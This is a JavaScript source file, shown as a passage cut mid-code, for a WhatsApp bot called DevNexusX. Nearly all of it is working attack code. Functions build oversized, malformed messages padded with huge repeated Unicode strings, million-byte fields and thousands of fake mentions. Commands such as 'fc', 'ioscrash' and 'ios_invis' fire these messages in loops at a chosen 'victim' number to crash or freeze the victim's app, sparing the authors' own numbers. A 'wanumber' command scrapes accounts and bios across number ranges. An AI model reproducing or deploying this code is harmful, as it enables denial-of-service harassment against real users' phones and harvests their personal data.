              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await DevNexusX.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    if (mention) {
      await DevNexusX.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}
async function hxdelay(target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\nsmb",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        fromMe: false,
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await DevNexusX.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Dev𝐍exus𝐗\0", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await DevNexusX.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await DevNexusX.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}

async function crashDevnexusX(target) {
    try {
        const interactivePayload = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: null
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    conversionSource: "porn",
                    conversionData: crypto.randomBytes(16),
                    conversionDelaySeconds: 9999,
                    forwardingScore: 999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Kornth",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "Telegram@DevNexusX NULL null 🦠"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },
                    expiration: -99999,
                    ephemeralSettingTimestamp: Date.now(),
                    ephemeralSharedSecret: crypto.randomBytes(16),
                    entryPointConversionSource: "WhatsaApp",
                    entryPointConversionApp: "WhatsApp",
                    actionLink: {
                        url: "t.me/F_1kE",
                        buttonTitle: "action_button"
                    },
                    disappearingMode: {
                        initiator: 1,
                        trigger: 2,
                        initiatorDeviceJid: target,
                        initiatedByMe: true
                    },
                    groupSubject: "Telegram@DevNexusX NULL 🦠",
                    parentGroupJid: "0@g.us",
                    trustBannerType: "X",
                    trustBannerAction: 99999,
                    isSampled: true,
                    externalAdReply: {
                        title: "Telegram@DevNexusX NULL 🦠",
                        mediaType: 2,
                        renderLargerThumbnail: false,
                        showAdAttribution: false,
                        containsAutoReply: false,
                        body: "Ai Kornth ",
                        thumbnail: null,
                        sourceUrl: "t.me/F_1kE",
                        sourceId: "9T7A4M1A",
                        ctwaClid: "ctwaClid",
                        ref: "ref",
                        clickToWhatsappCall: true,
                        ctaPayload: "ctaPayload",
                        disableNudge: true,
                        originalImageUrl: null
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "0@newsletter",
                        serverMessageId: 1,
                        newsletterName: `Crash DevNexusX ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                        contentType: 3,
                        accessibilityText: "Telegram@DevNexusX NULL 🦠"
                    },
                    statusAttributionType: 2,
                    utm: {
                        utmSource: "XsSource",
                        utmCampaign: "XsCampaign"
                    }
                },
                body: {
                    text: "Telegram@DevNexusX NULL 🦠"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }]
                }
            }
        };

        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
        await DevNexusX.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: target,
                expiryTimestamp: null,
                contextInfo: {
                    remoteJid: " S ",
                    isForwarded: true,
                    forwardingScore: 979,
                    externalAdReply: {
                        title: " ⁖Telegram@DevNexusX NULL🇪🇬🦅system 🦠",
                        body: "Telegram@DevNexusX NULL🇪🇬🦅🦠",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewType: "VIDEO",
                        sourceUrl: "DevNexusX",
                        mediaUrl: "DevNexusX NULL",
                        showAdAttribution: true,
                    }
                }
            }
        };

        await DevNexusX.relayMessage(target, paymentPayload, {
            participant: { jid: target },
            quoted: null,
            userJid: null,
            messageId: null
        });
        
    } catch (err) {
        console.error("Error", err);
    }
}
//==============================================================\\
async function dev3(scok, target) {
const m ="*Devnxus*\n" + "᬴᬴᬴".repeat(10000) + "ꦽ".repeat(10000);
const msg = generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/536947447_1412181393374788_5754902187958743661_n.enc?ccb=11-4&oh=01_Q5Aa2QHE701xHvkaXe2xrrKdK0yGSE1m-XXVZoQr6NXQ0D_UIA&oe=68CBC1A5&_nc_sid=5e03e0&mms3=true",
        directPath: "/v/t62.7161-24/536947447_1412181393374788_5754902187958743661_n.enc?ccb=11-4&oh=01_Q5Aa2QHE701xHvkaXe2xrrKdK0yGSE1m-XXVZoQr6NXQ0D_UIA&oe=68CBC1A5&_nc_sid=5e03e0",
        mimetype: "video/mp4",
        mediaKey: "6ZqW6nfUjtB5nm6uSDv2cCAHnLI9KB8qdDmyTvpkpaY=",
        fileEncSha256: "+ajyCfrHHR2gP4MQyDIQLMcXIHNyOylsoQCy5D7TdcU=",
        fileSha256: "o+2teftJNLSyH5iahKgd4H82zSOXLNogHjF7IF9E8Ng=",
        fileLength: 2878469,
        mediaKeyTimestamp: 1755601131,
        height: 640,
        width: 640,
        caption: m,
        contextInfo: {
          mentionedJid: Array.from(
            { length: 1990 },
            () => `1${Math.floor(Math.random() * 899999999999)}@s.whatsapp.net`
          ),
          forwardingScore: 999,
          isForwarded: true,
          quotedMessage: {
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/536947447_1412181393374788_5754902187958743661_n.enc?ccb=11-4&oh=01_Q5Aa2QHE701xHvkaXe2xrrKdK0yGSE1m-XXVZoQr6NXQ0D_UIA&oe=68CBC1A5&_nc_sid=5e03e0&mms3=true",
              directPath: "/v/t62.7161-24/536947447_1412181393374788_5754902187958743661_n.enc?ccb=11-4&oh=01_Q5Aa2QHE701xHvkaXe2xrrKdK0yGSE1m-XXVZoQr6NXQ0D_UIA&oe=68CBC1A5&_nc_sid=5e03e0",
              mimetype: "video/mp4",
              mediaKey: "6ZqW6nfUjtB5nm6uSDv2cCAHnLI9KB8qdDmyTvpkpaY=",
              fileEncSha256: "+ajyCfrHHR2gP4MQyDIQLMcXIHNyOylsoQCy5D7TdcU=",
              fileSha256: "o+2teftJNLSyH5iahKgd4H82zSOXLNogHjF7IF9E8Ng=",
              fileLength: 2878469,
              mediaKeyTimestamp: 1755601131,
              height: 640,
              width: 640,
              caption: m,
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 1990 },
                  () => '1${Math.floor(Math.random() * 899999999999)}@s.whatsapp.net'
                ),
                forwardingScore: 999,
                isForwarded: true
              }
            }
          },
          participant: "0@s.whatsapp.net",
          stanzaId: "o" + Math.floor(Math.random() * 10),
          remoteJid: target
        }
      }
    }
  }
}, {});
await DevNexusX.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: undefined
            }
          ]
        }
      ]
    }
  ]
});
}





async function gg6(target) {
  const x = generateWAMessageFromContent(target, {
    lottieStickerMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0&mms3=true",
          fileSha256: "fxxvVtTCmZ2Bpm/GEYpFF2GKUzJ8wWVrGY1mCmmh4I4=",
          fileEncSha256: "3xsWx0Y/1pNbWXWh/OG2mt4Ld0FEug25kyZ+lC+UbV4=",
          mediaKey: "uHEU7OghGYVW7IcWjhNlxPeZHNS0qfphvRUcy6+22wo=",
          mimetype: "application/was",
          height: 64,
          width: 64,
          directPath: "/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0",
          fileLength: "13862",
          mediaKeyTimestamp: "1763628089",
          isAnimated: true,
          stickerSentTs: "1763628089111",
          isAvatar: false,
          isAiSticker: false,
          isLottie: true, 
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "1@newsletter",
              newsletterName: "7eppeli - Expos3d"
            },
            quotedMessage: fQ.revPayQ.message,
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});
  DevNexusX.relayMessage(target, x.message, {
    participant: { jid:target }
  })
}
//==============================================================\\
async function xiosinvi(target){
	const xeonIpong = "Telegram: @dgxeo13 "+ "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @F_1KE","flow_id":"Telegram: @F_1KE","flow_message_version":"9.903","flow_token":"Telegram: @F_1KE"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @F_1KE" }]
                    }
                }
            }
        }
    }), { userJid: target });
await DevNexusX.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @F_1KE" + xeonIpong,
            url: "https://youtube.com/@DGXeom"
        }
    }, { participant: { jid: target } });
    
    await DevNexusX.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @F_1KE" + xeonIpong,
            url: "https://youtube.com/@DGXeon"
        }
    }, { participant: { jid: target } });
    }
//==============================================================\\
async function bugiosgogo(target) {
  DevNexusX.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `⭑̤⟅̊༑ ▾⭑̤▾ ⿻ 𝘾͢𝙧𝙖𝙯̌𝙮 𝘾͢𝙧𝙖͠𝙨̋𝙝 𝙆͢𝙞𝙡𝙡 𝙔͢𝙤𝙪̌ ⿻ ▾ ༑̴⟆` + "࣯ꦾ".repeat(5000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation:
              "⭑̤⟅̊༑ ▾⭑̤▾ ⿻ 𝘾͢𝙧𝙖𝙯̌𝙮 𝘾͢𝙧𝙖͠𝙨̋𝙝 𝙆͢𝙞𝙡𝙡 𝙔͢𝙤𝙪̌ ⿻ ▾ ༑̴⟆" + "ꦾ".repeat(5000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}
//==============================================================\\
async function xeonIosInvi(isTarget) {
await DevNexusX.sendMessage(isTarget, {
text: "ཹ‌⃰" + "⛧DevNexusX⛧" + "ཹ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧DevNexusX⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/Nova`
}
}
}, {})
}
//==============================================================\\
//==============================================================\\
async function xiosinv(destinatario){
tmsg = await generateWAMessageFromContent(destinatario, {
               viewOnceMessage: {
                   message: {
                       listResponseMessage: {
                           title: 'DevNexusX\n',
                           description:"\n\n\n"+"𑪆".repeat(260000),
                           singleSelectReply: {
                               selectedId: "id"
                           },
                           listType: 1
                       }
                   }
               }
       }, {});

       await DevNexusX.relayMessage("status@broadcast", tmsg.message, {
           messageId: tmsg.key.id,
           statusJidList: [destinatario],
           additionalNodes: [{
               tag: "meta",
               attrs: {},
               content: [{
                   tag: "mentioned_users",
                   attrs: {},
                   content: [{
                       tag: "to",
                       attrs: { jid: destinatario },
                       content: undefined,
                   }],
               }],
           }],
       });
       }
       
       
       async function nexusDelay(target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          body: {
            text: "DevNexusX NET💢",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message", 
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            }
          }
        }
      }
    }
  }, {});

  await DevNexusX.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}
//==============================================================\\
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
//==============================================================\\
//==============================================================\\
if (m.message) {

    // Log the message details
    console.log(
        chalk.black(chalk.bgWhite('[ MESSAGE ]')),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' +
        chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' +
        chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', from)
    );
}

switch(command) {
/*case 'xjxjxjxoke': {
	let audiobuffy = fs.readFileSync(`./oke.mp3`)
	DevNexusX.sendMessage('919863235489@s.whatsapp.net', { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true })     
	}
	k*/
	
	case 'jo_invisable': {
//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "201118127946") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "201117932231") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("الرقم غير مسجل في تطبيق واتساب.");
  }
sendMessageWithMentions(
    "*تم نيكه من قبل امر JO_INVISABLE انتظر ٢ ثم ارمي تاني*", 
    [Xreturn]
  );
  for (let i = 0; i <5; i++) {
await dev3(DevNexusX, Xreturn)
}
}
break
	
	case 'ios_invis': {
//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "201118127946") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "201126699326") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("الرقم غير مسجل في تطبيق واتساب.");
  }
sendMessageWithMentions(
    "تم نيكه من قبل امر ios_invis انتظر ٢ ثم ارمي تاني*", 
    [Xreturn]
  );
  for (let i = 0; i <999; i++) {
await xiosinv(Xreturn)
}
}
break

	case 'fc1':
	case 'fc': {
//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "201118127946") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "201117932231") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("رقم ده مش موجود في وتس اصلا");
  }
sendMessageWithMentions(
    "*تم نيكه من قبل امر fc و fc1 انتظر ٢ ثم ارمي تاني*", 
    [Xreturn]
  );
  for (let i = 0; i <100; i++) {
await crashnotag(Xreturn)
await crashnewhx(DevNexusX, Xreturn)
await sleep (100)
await crashnotag(Xreturn)
await crashnotag(Xreturn)
await sleep (100)
await crashnewhx(DevNexusX, Xreturn)
await crashnewhx(DevNexusX, Xreturn)
await sleep (100)
await crashnewhx(DevNexusX, Xreturn)
await sleep (100)
await crashnotag(Xreturn)
}
}
break

	case 'f': {
	await DevNexusX.sendMessage(m.chat, {
                location: {
                    degreesLatitude: 'Telegram: @F_1KE',
                    degreesLongitude: 'Telegram: @F_1KE',
                    name: `Telegram: @F_1KE`,
                    url: bugUrl,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        isLiveLocation: true,
                        fromMe: false,
                        participant: '0@s.whatsapp.net',
                        remoteJid: sender,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                title: "crash",
                                pageCount: 1000000000,
                                fileName: "crash.pdf",
                                contactVcard: true
                            }
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363274419284848@newsletter',
                            serverMessageId: 1,
                            newsletterName: " " + bug + bug
                        },
                        externalAdReply: {
                            title: ' Telegram: @F_1KE ',
                            body: 'Telegram: @F_1KE',
                            mediaType: 0,
                            thumbnail: m,
                            jpegThumbnail: m,
                            mediaUrl: `https://www.youtube.com/@%E3%83%85JOALHAKEM`,
                            sourceUrl: `https://www.youtube.com/@%E3%83%85JOALHAKEM`
                        }
                    }
                }
            });
            }
            break
	case 'com': {
    if (!text) return replygcxeon(`*example:*\n ${prefix + command} +92XXX`);
    let target = `${q.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
    await albumbuggers2(target, true);
    await albumbuggers1(target, true);
    replygcxeon(`*success send bug ${command} to ${target}*`);
  console.log(chalk.green(`succes send bugs to ${target}`))
}
break
	case 'device': case 'checkdevice': case 'cekdevice': {
		//
  if (!isBot) return;

  const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedMessageId = m.message?.extendedTextMessage?.contextInfo?.stanzaId;

  if (!quotedMsg || !quotedMessageId) {
    await DevNexusX.sendMessage(from, { text: 'Quote The Target Message' }, { quoted: m });
    break;
  }

  const devicec = 
    quotedMessageId.length > 21
      ? 'Device: Android'
      : quotedMessageId.startsWith('3A')
        ? 'Device: iOS'
        : 'Device: WhatsApp Web or BotAPI';

  await DevNexusX.sendMessage(from, { text: devicec }, { quoted: m });
  }
  break;
	case 'ioscrash':  {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "201117932231") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "201118127946") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("رقم مش كوجود في وتس اصلا");
  }
  
  sendMessageWithMentions(
    "*تم إرسال كراش امر ioscrash للضحيه*", 
    [Xreturn]
  );
		for (let i = 0; i < 13; i++) {
await xeonIosInvi(Xreturn);
await sleep(1000);
}
		}
		break
	case 'xxxjammer':  {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		await sendMessagesForDurationX(1, Xreturn);
		}
		break
		case 'xjammer2xx':  {
//
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await DevNexusX.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "201104394429") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		await sendMessagesForDuration(1, Xreturn);
		}
		break
  
	case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
		//
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await DevNexusX.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await DevNexusX.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
	
	case 'xxxcrash_quotedxxx':
                for (let i = 0; i < 1; i++) {
                    await DevNexusX.relayMessage(from, {
                        "extendedTextMessage": {
                            "text": "😂",
                            "contextInfo": {
                                "stanzaId": generateMessageID(),
                                "participant": from,
                                "quotedMessage": {
                                    "contactMessage": {
                                        "displayName": "@bruxel4s crashed youKKKKKKK",
                                        "vcard": "BEGIN:VCARD\nVERSION:3.0\nFN:@bruxel4s\nX-WA-BIZ-NAME:BruxinNerdola\n\nORG:@bruxel4s;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
                                    }
                                }
                            }
                        }
                    }, {})
                }
                break;
	
	case 'xxfcgrub':
	async function fcgrubNomorBrasil(target){
await DevNexusX.sendMessage(target, {
    text: 'dgxeon_prindapan_boy',
    contextInfo: {
        mentionedJid: ['5521992999999@s.whatsapp.net'], // The person being mentioned
        stanzaId: generateMessageID(),
        participant: from,
        quotedMessage: {
            callLogMessage: {
                callType: 'AUDIO', // or 'VIDEO'
                callOutcome: 1, // 1 = missed
                durationSecs: '0',
